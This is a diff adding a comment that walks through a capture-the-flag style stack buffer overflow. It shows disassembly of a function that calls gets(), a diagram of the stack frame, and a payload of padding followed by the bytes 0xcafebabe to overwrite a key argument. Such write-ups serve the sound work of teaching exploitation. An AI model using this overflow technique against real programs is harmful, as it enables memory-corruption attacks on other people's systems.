@@ -1,0 +1,41 @@
+// Buffer Overflow
+/*
+
+gets() will keep copying data until the NULL byte (\x00)
+We can enter in as much data as we need to smash over the key.
+Need to visualize the stack frame first, so we know how many bytes to send
+
+disassembly of func (the parts we need)
+
+0000062c <func>:
+ 62c:   55                      push   %ebp
+ 62d:   89 e5                   mov    %esp,%ebp
+ 62f:   83 ec 48                sub    $0x48,%esp
+ 632:   65 a1 14 00 00 00       mov    %gs:0x14,%eax
+ 638:   89 45 f4                mov    %eax,-0xc(%ebp)
+ 63b:   31 c0                   xor    %eax,%eax
+ 63d:   c7 04 24 8c 07 00 00    movl   $0x78c,(%esp)
+ 644:   e8 fc ff ff ff          call   645 <func+0x19>
+ 649:   8d 45 d4                lea    -0x2c(%ebp),%eax			//overflowme init
+ 64c:   89 04 24                mov    %eax,(%esp)
+ 64f:   e8 fc ff ff ff          call   650 <func+0x24> 			//gets()
+ 654:   81 7d 08 be ba fe ca    cmpl   $0xcafebabe,0x8(%ebp)
+
+Stack Frame (recommend going into gdb and breaking in func to visualize the stack)
+
+___________
+key or %ebp+0x8 (4 bytes)
+___________
+eip (4 bytes)
+___________
+ebp (4 bytes)
+___________
+overflowme (0x2c bytes)
+___________
+
+
+Need to send "A"*0x2c + "B"*8 + "\xbe\xba\xfe\xca"
+0x2c As to fill the overflowme allocation
+8 Bs to fill ebo and eip
+and the actual bytes we need for the cmp
+*/
